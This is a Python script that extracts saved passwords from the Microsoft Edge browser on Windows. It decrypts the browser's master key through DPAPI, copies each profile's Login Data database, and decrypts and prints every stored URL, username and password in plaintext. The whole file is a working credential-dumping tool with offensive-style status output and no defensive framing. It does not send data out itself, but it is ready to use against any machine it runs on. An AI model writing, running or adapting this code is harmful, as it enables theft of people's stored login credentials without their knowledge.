import sys
import base64
import json
import sqlite3
import shutil
import os
import ctypes
import ctypes.wintypes
sys.stdout.reconfigure(encoding='utf-8')

# DPAPI structure
class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', ctypes.wintypes.DWORD),
                ('pbData', ctypes.POINTER(ctypes.c_char))]

def dpapi_decrypt(encrypted):
    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0,
        ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result

def get_master_key(local_state_path):
    with open(local_state_path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    enc_key = base64.b64decode(data['os_crypt']['encrypted_key'])[5:]
    return dpapi_decrypt(enc_key)

def decrypt_password(password, master_key):
    if password[:3] == b'v10':
        from Crypto.Cipher import AES
        iv = password[3:15]
        payload = password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode('utf-8', errors='replace')
    else:
        return dpapi_decrypt(password).decode('utf-8', errors='replace')

def get_credentials(login_data_path, master_key):
    tmp = os.path.expandvars(r'%PUBLIC%\ld_tmp')
    shutil.copy(login_data_path, tmp)
    try:
        conn = sqlite3.connect(tmp)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        results = []
        for url, username, password in cursor.fetchall():
            if not url and not username and not password:
                continue
            try:
                decrypted = decrypt_password(password, master_key)
            except Exception as e:
                decrypted = f'[decryption failed: {e}]'
            results.append((url, username, decrypted))
        conn.close()
        return results
    finally:
        try:
            os.remove(tmp)
        except:
            pass

def main():
    base = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data')
    local_state = os.path.join(base, 'Local State')

    if not os.path.exists(local_state):
        print('[-] Edge Local State not found')
        return

    print('[*] Getting master key...')
    try:
        master_key = get_master_key(local_state)
        print('[+] Master key retrieved')
    except Exception as e:
        print(f'[-] Failed to get master key: {e}')
        return

    profiles = ['Default'] + [d for d in os.listdir(base) if d.startswith('Profile')]

    for profile in profiles:
        login_data = os.path.join(base, profile, 'Login Data')
        if not os.path.exists(login_data):
            continue

        print(f'\n[*] Profile: {profile}')
        print('-' * 40)

        creds = get_credentials(login_data, master_key)
        if not creds:
            print('  No credentials found')
            continue

        for url, username, password in creds:
            print(f'  URL:  {url}')
            print(f'  User: {username}')
            print(f'  Pass: {password}')
            print()

if __name__ == '__main__':
    main()
